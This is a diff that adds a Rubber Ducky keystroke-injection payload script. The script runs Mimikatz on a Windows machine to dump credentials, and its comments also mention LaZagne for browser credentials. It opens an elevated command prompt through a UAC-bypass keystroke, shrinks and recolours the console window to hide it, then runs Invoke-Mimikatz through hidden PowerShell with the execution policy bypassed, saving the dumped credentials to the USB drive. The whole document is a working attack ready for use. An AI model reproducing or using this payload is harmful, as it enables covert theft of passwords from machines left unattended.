@@ -1,0 +1,44 @@
+REM Runs mimikatz to get windows creds
+REM and lazagne to get browser creds
+REM Author: Hak5Darren Props: Mubix, Clymb3r, Gentilkiwi
+REM Thanks to: https://www.hak5.org/blog/15-second-password-hack-mr-robot-style
+REM -------------------------------------------------------------------------------------
+DELAY 5000
+REM get rid of autostart message from storage of ducky
+ALT F4
+DELAY 500
+DELAY 500
+ESCAPE
+DELAY 500
+CONTROL ESCAPE
+DELAY 500
+STRING cmd
+DELAY 500
+CTRL-SHIFT ENTER
+DELAY 1000
+REM <uac_bypass_key> will be replaced by PyDuckGen when generating the payload
+ALT <uac_bypass_key>
+DELAY 1000
+ENTER
+ENTER
+ENTER
+REM -------------------------------------------------------------------------------------
+REM Obfuscate the command prompt
+REM -------------------------------------------------------------------------------------
+STRING mode con:cols=18 lines=1
+ENTER
+STRING color FE
+ENTER
+DELAY 1000
+REM -------------------------------------------------------------------------------------
+REM Get drive letter of drive with label DUCKY
+REM -------------------------------------------------------------------------------------
+STRING for /f %d in ('wmic volume get driveletter^, label^|findstr "DUCKY"') do @set duck=%d
+ENTER
+DELAY 500
+REM -------------------------------------------------------------------------------------
+REM Copy and execute Invoke Mimikatz
+REM -------------------------------------------------------------------------------------
+STRING if exist %duck%\exec\mimikatz.ps1 powershell -NoP -NonI -W Hidden -Exec Bypass "Import-Module %duck%\exec\mimikatz.ps1;Invoke-Mimikatz -DumpCreds|Out-File '%duck%\data\mimikatz\%computername%_creds.txt';"
+ENTER
+REM -------------------------------------------------------------------------------------
